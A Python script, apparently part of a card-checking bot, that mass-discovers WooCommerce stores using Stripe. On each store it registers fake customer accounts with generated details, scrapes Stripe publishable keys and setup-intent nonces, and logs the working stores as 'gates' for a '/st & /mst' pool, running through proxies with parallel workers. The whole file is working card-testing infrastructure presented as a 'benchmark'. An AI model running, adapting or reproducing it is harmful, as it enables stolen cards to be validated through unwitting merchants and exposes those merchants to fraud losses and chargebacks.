"""
1k WooCommerce Sites Discovery and Real-Gate Capability Verification Test.
Harvests up to 1000 WooCommerce candidate domains using Dorks + Seeds + WP.org
and tests their real gate capability (PK + Registration + Nonce extraction).
"""
import asyncio, sys, logging, time
sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

from core.auto_discover import discover_stripe_sites
from database.db import get_working_proxies, init_db
import aiohttp
from aiohttp import ClientTimeout as _CT, CookieJar as _CJ
import re
import random
from faker import Faker

faker = Faker()
logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")

_PATH_CANDIDATES = [
    {"add": "/my-account/add-payment-method/", "post": "/my-account/"},
    {"add": "/en/moj-racun/add-payment-method/", "post": "/en/moj-racun/"},
    {"add": "/moj-racun/add-payment-method/", "post": "/moj-racun/"},
]

_NONCE_PATTERNS = [
    r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
    r"'createAndConfirmSetupIntentNonce'\s*:\s*'([^']+)'",
    r'"setupIntentNonce"\s*:\s*"([^"]+)"',
    r'"stripe_setup_nonce"\s*:\s*"([^"]+)"',
    r'"wc_stripe_setup_nonce"\s*:\s*"([^"]+)"',
    r'name="_ajax_nonce"\s+value="([a-f0-9]+)"',
    r'"_ajax_nonce"\s*:\s*"([a-f0-9]{10,})"',
    r'"nonce"\s*:\s*"([a-f0-9]{10,})"',
]

_HDR = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
    "Accept-Language": "en-US,en;q=0.9",
}

async def verify_gate_capability(site_url: str) -> dict:
    if not site_url.startswith("http"):
        site_url = "https://" + site_url
    site_url = site_url.rstrip("/")

    res = {"url": site_url, "working": False, "reason": "", "pk": "", "nonce": ""}
    jar = _CJ(unsafe=True)

    try:
        async with aiohttp.ClientSession(
            cookie_jar=jar,
            connector=aiohttp.TCPConnector(ssl=False, limit=3, force_close=True)
        ) as sess:
            html_1 = ""
            active_paths = None

            # Step 1: Find add-payment-method page containing pk_live_
            for paths in _PATH_CANDIDATES:
                url_1 = f"{site_url}{paths['add']}"
                try:
                    async with sess.get(url_1, headers=_HDR, ssl=False, timeout=_CT(total=8), allow_redirects=True) as r:
                        if r.status == 200:
                            txt = await r.text(errors="ignore")
                            if "pk_live_" in txt:
                                html_1 = txt
                                active_paths = paths
                                break
                except Exception:
                    pass

            if not active_paths:
                res["reason"] = "Endpoint/pk_live_ missing"
                return res

            pk_m = re.search(r'pk_live_[a-zA-Z0-9]{24,}', html_1)
            res["pk"] = pk_m.group(0)[:16] + "..." if pk_m else "found"

            # Step 2: Registration check
            reg_match = re.search('name="woocommerce-register-nonce" value="(.*?)"', html_1)
            if not reg_match:
                reg_match = re.search('name="woocommerce-login-nonce" value="(.*?)"', html_1)

            if reg_match:
                reg_nonce = reg_match.group(1)
                fake_user = faker.user_name()[:10] + str(random.randint(100, 999))
                data = {
                    'email': faker.email(),
                    'username': fake_user,
                    'woocommerce-register-nonce': reg_nonce,
                    'register': 'Register',
                }
                post_url = f"{site_url}{active_paths['post']}"
                try:
                    await sess.post(post_url, headers=_HDR, data=data, ssl=False, timeout=_CT(total=8))
                except Exception:
                    pass

                try:
                    add_url = f"{site_url}{active_paths['add']}"
                    async with sess.get(add_url, headers=_HDR, ssl=False, timeout=_CT(total=8)) as r_auth:
                        if r_auth.status == 200:
                            html_1 = await r_auth.text(errors="ignore")
                except Exception:
                    pass

            # Step 3: Nonce extraction check
            ajax_nonce = None
            for pat in _NONCE_PATTERNS:
                m = re.search(pat, html_1)
                if m:
                    ajax_nonce = m.group(1)
                    break

            if not ajax_nonce:
                res["reason"] = "Nonce extraction failed"
                return res

            res["nonce"] = ajax_nonce[:10] + "..."
            res["working"] = True

    except Exception as e:
        res["reason"] = f"Error: {str(e)[:30]}"

    return res

async def main():
    await init_db()
    print("=" * 80)
    print("🚀 1,000 WooCommerce Sites Discovery & Gate Verification Benchmark Test")
    print("=" * 80)

    proxies = await get_working_proxies()
    proxy = None
    if proxies:
        p = proxies[0]
        proxy = {
            "host": p["host"],
            "port": p["port"],
            "username": p.get("username", ""),
            "password": p.get("password", ""),
            "protocol": p.get("protocol", "http")
        }
        print(f"📡 Using Proxy: {p['host']}:{p['port']}")
    else:
        print("⚠️ No proxies in DB. Running without proxy...")

    start_time = time.time()

    async def progress_cb(found, target):
        print(f"  [Harvesting Progress] Found {found}/{target} candidate domains...")

    print("\n🔍 Step 1: Harvesting 1,000 candidate WooCommerce sites across Search Engines...")
    domains = await discover_stripe_sites(count=1000, proxy=proxy, progress_cb=progress_cb)
    print(f"✅ Total Discovered: {len(domains)} candidate domains\n")

    if not domains:
        print("❌ No domains discovered.")
        return

    print("🔬 Step 2: Parallel Gate Probing (PK + Account Registration + Nonce)...")
    verified = []
    failed = []

    sem = asyncio.Semaphore(30) # 30 parallel workers

    async def worker(domain):
        async with sem:
            res = await verify_gate_capability(domain)
            if res["working"]:
                verified.append(res)
            else:
                failed.append(res)

    await asyncio.gather(*[worker(d) for d in domains])

    elapsed = round(time.time() - start_time, 2)

    print("\n" + "=" * 80)
    print("📊 1,000-SITE BENCHMARK RESULTS")
    print("=" * 80)
    print(f"⏱️ Total Execution Time : {elapsed} seconds")
    print(f"🌐 Candidates Harvested : {len(domains)}")
    print(f"⭐ Fully Verified Gates : {len(verified)}")
    print(f"❌ Failed / Non-functional: {len(failed)}")
    print("=" * 80)

    if verified:
        print("\n✅ SAMPLE VERIFIED WORKING GATES (Ready for /st & /mst DB pool):")
        for v in verified[:15]:
            print(f"  • {v['url']:40s} | PK: {v['pk']:18s} | Nonce: {v['nonce']}")

    # Save summary report to file
    report_file = "scratch/1k_scan_report.txt"
    with open(report_file, "w", encoding="utf-8") as f:
        f.write(f"1K WooCommerce Scan Report\nTotal: {len(domains)}\nVerified: {len(verified)}\nFailed: {len(failed)}\n\nVERIFIED GATES:\n")
        for v in verified:
            f.write(f"{v['url']} | PK: {v['pk']} | Nonce: {v['nonce']}\n")
    print(f"\n📄 Saved detailed report to {report_file}")

if __name__ == "__main__":
    asyncio.run(main())
